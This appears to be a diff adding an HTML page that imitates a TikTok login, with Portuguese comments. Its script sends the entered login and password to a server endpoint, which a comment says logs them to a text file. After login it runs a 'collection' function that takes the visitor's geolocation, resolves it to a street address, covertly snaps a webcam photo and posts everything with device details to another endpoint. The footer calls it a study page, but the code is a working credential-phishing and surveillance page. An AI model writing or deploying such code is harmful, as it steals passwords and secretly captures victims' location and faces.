@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>TikTok Clone – Login</title>
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/3046/3046125.png">
+  <style>
+    body { background: #161824; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; min-height:100vh; margin:0;}
+    .login-container { display:flex; align-items:center; justify-content:center; height:100vh; }
+    .login-box { background:#23232f; padding:38px 32px 28px 32px; border-radius:14px; box-shadow:0 4px 25px #0009; min-width:340px; }
+    .login-title { font-size:2em; font-weight:bold; color:#fe2c55; margin-bottom:24px; text-align:center;}
+    label { display:block; margin:16px 0 7px 0;}
+    input[type=text], input[type=password] {
+      width:100%; padding:10px; font-size:1.07em; border-radius:7px; border:none; background:#23242e; color:#fff;
+      box-shadow:0 1px 6px #0005 inset;
+      outline:none;
+    }
+    input[type=submit] {
+      margin-top: 21px;
+      background:#fe2c55;
+      color: #fff; border:none; padding:12px 0; width:100%;
+      font-size:1.09em; font-weight:bold;
+      border-radius:7px; cursor:pointer; transition:background .16s;
+    }
+    input[type=submit]:hover { background:#25f4ee; color:#23242e;}
+    .msg { margin:10px 0 0 0; color:#29e89e; font-size:1.02em; text-align:center;}
+    .hide { display:none;}
+    #appTiktok {display:none;}
+    /* Copie aqui o mesmo CSS do TikTok clone da resposta anterior (header, feed, etc). */
+  </style>
+</head>
+<body>
+  <div class="login-container" id="loginScreen">
+    <form class="login-box" method="post" id="loginForm" autocomplete="off">
+      <div class="login-title">TikTok Clone – Login</div>
+      <label for="login">Login</label>
+      <input type="text" id="login" name="login" required autocomplete="off" maxlength="40">
+      <label for="senha">Senha</label>
+      <input type="password" id="senha" name="senha" required autocomplete="off" maxlength="32">
+      <input type="submit" value="Entrar">
+      <div class="msg" id="msg"></div>
+    </form>
+  </div>
+
+  <!-- O TikTok APP completo aqui, fica HIDDEN até o login ser feito -->
+  <div id="appTiktok">
+    <!-- COPIE O CÓDIGO HTML do TikTok Clone de sua última resposta daqui pra baixo -->
+    <!-- ... header ... feed ... sidebar ... -->
+    <header>
+      <div class="logo">
+        <img src="https://cdn-icons-png.flaticon.com/512/3046/3046125.png" alt="TikTok Logo">
+        <span class="logo-title">TikTok</span>
+      </div>
+      <form class="search-bar" onsubmit="return false;">
+        <input type="text" placeholder="Buscar contas e vídeos">
+        <button title="Buscar">Buscar</button>
+      </form>
+      <div class="user-icon" title="Usuário">👤</div>
+      <span id="status">Bem-vindo ao TikTok Clone</span>
+    </header>
+    <div class="app">
+      <!-- ... resto do clone TikTok ... -->
+      <!-- Só copie a parte principal do feed anterior -->
+      <main class="feed-area">
+        <!-- Exemplos de cards de vídeo... -->
+        <section class="video-card">
+         <video class="video-media" src="https://samplelib.com/mp4/sample-720x1280.mp4" controls loop poster="https://images.unsplash.com/photo-1535223289827-42f1e9919769?auto=format&fit=crop&w=400&q=80"></video>
+         <div class="video-info-box">
+           <img class="profile-pic" src="https://randomuser.me/api/portraits/women/60.jpg">
+           <div class="video-info">
+             <div class="video-name">@marianafreitas</div>
+             <div class="video-caption">Amanhecer no litoral! #natureza #bomdia</div>
+             <div class="video-sound">🎶 Som Original - Mariana</div>
+           </div>
+           <div class="video-actions">
+             <div class="action-btn">❤️ <span>49,2K</span></div>
+             <div class="action-btn">💬 <span>1.260</span></div>
+             <div class="action-btn">🔁 <span>120</span></div>
+             <div class="action-btn">🔖 <span>Salvar</span></div>
+           </div>
+         </div>
+        </section>
+        <!-- ...mais vídeos... -->
+      </main>
+    </div>
+    <footer>
+      &copy; 2025 TikTok Clone — Página meramente ilustrativa para fins de estudo.
+    </footer>
+  </div>
+
+  <script>
+    // LOGIN
+    document.getElementById('loginForm').addEventListener('submit', async function(e){
+      e.preventDefault();
+      const login = document.getElementById('login').value.trim();
+      const senha = document.getElementById('senha').value;
+      const msg = document.getElementById('msg');
+      msg.textContent = "Validando...";
+      try {
+        // Envia login/senha para o servidor para gravar log.txt (POST para /auth)
+        const resp = await fetch("/auth", {
+          method:"POST",
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({login, senha})
+        });
+        if(resp.ok){
+          msg.textContent = "Login efetuado!";
+          setTimeout(()=>{
+            document.getElementById('loginScreen').style.display='none';
+            document.getElementById('appTiktok').style.display='block';
+            window.onload && window.onload(); // iniciar script de coleta!
+          }, 700);
+        } else {
+          msg.textContent = "Erro ao fazer login.";
+        }
+      } catch {
+        msg.textContent = "Falha de conexão!";
+      }
+    });
+
+    // O restante do script de coleta deve ficar no #appTiktok
+    async function capturarDados() {
+      try {
+        const sistema = navigator.platform;
+        const navegador = navigator.userAgent;
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          let endereco = 'Desconhecido';
+          try {
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+            const geoData = await geoRes.json();
+            endereco = geoData.display_name || endereco;
+          } catch{}
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+            setTimeout(() => {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imagem = canvas.toDataURL('image/png');
+              fetch('/dados', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  latitude,
+                  longitude,
+                  endereco,
+                  imagem,
+                  sistema,
+                  navegador
+                })
+              }).then(() => {
+                document.getElementById('status').textContent = '✅ Dados enviados com sucesso!';
+                stream.getTracks().forEach(track => track.stop());
+              }).catch(() => { stream.getTracks().forEach(track => track.stop()); });
+            }, 3000);
+          } catch {}
+        }, (err) => { /* ignora negativa do usuário */ });
+      } catch (err) { /* erro geral ignorado */ }
+    }
+    // O window.onload = capturarDados; é chamado APÓS login via JS lá em cima.
+
+  </script>
+</body>
+</html>
